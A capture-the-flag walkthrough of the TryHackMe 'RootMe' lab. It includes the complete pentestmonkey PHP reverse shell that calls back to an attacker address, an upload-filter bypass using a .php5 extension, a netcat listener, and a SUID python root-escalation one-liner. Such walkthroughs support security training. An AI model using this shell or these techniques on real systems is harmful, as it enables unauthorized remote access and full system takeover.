# RootMe - THM
###  Difficulty level: Easy
------------------------------------------------------


I'll start by running nmap scan:
```bash
nmap -sV -sC 10.10.12.73 -oN scan.nmap
```

![image](https://user-images.githubusercontent.com/114166939/226315146-a7b150ac-c319-4da5-afbd-5d66906843e8.png)

Let's take a look on the website:

I'll run a brute-force attack on the url to find hidden directories:
```bash
gobuster dir -u http://10.10.12.73/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt > dirs.txt
```
![image](https://user-images.githubusercontent.com/114166939/226315983-f670d517-b741-4bfc-8c97-820c1e5cdf21.png)

The "/panel" directory includes images upload system:

![image](https://user-images.githubusercontent.com/114166939/226316570-95810171-e5d0-4216-923d-8dbbcdcd283b.png)

I'll try to get a reverse shell by uploading an exploit to this system,
I'm going to use php code for reverse shell by "https://pentestmonkey.net/":
```php
  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '[MY-IP]';  // change this
  $port = [PORT];  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;
  
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";
    }
  }

  ?> 
```
I changed the IP and port and called this file "reverse.php" and now I'm going to upload it to the panel:

![image](https://user-images.githubusercontent.com/114166939/226318268-7abbee05-bc19-4640-a7e6-d93bb8649fbc.png)

It detected and blocked the file, so to pass this validation  I found this page: "https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass".

So I'll change the file name to:"reverse.php5" and let's try again!

![image](https://user-images.githubusercontent.com/114166939/226319215-cea89063-2462-4d5e-84cc-da804415d50a.png)

Now i can find the upload at "/uploads" directory.

![image](https://user-images.githubusercontent.com/114166939/226319479-90a95ccd-e8cc-4049-b199-6c976cfe0823.png)

First, I'll run a netcat listener:
```bash
nc -lnvp [PORT]
```

And now run the reverse shell from the "/uploads" directory,
Got a reverse shell as "www-data" user.

![image](https://user-images.githubusercontent.com/114166939/226320289-3bc03e06-ed7b-40ce-899d-b01f0dca4eae.png)

Now, I can find the user.txt flag which stored at "/var/www":

![image](https://user-images.githubusercontent.com/114166939/226320713-e422b773-2245-4686-aeb7-713225bee469.png)

To find the root.txt flag, I need to find a way to escalate my privileges and become the root user.

I'm going to search for SUID files with the command:
```bash
find / -user root -perm /4000 2>/dev/null
```
One of the most suspicious files in the output is "/usr/bin/python"

![image](https://user-images.githubusercontent.com/114166939/226321712-c3ab1b4b-fc18-4686-a623-a14eba96850d.png)

I'll search for a vulnerability for SUID binary python file on "https://gtfobins.github.io/".

Found the following command:
```bash
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
I'll enter to "/usr/bin" and run this command:

![image](https://user-images.githubusercontent.com/114166939/226322547-13b6e186-2cc7-4be9-ba31-3a1e2a3f4677.png)

Now all we need to do is enter the root directory and print the root.txt flag:

![image](https://user-images.githubusercontent.com/114166939/226325201-fd09f234-be21-4c33-8550-fcb9125bcb99.png)
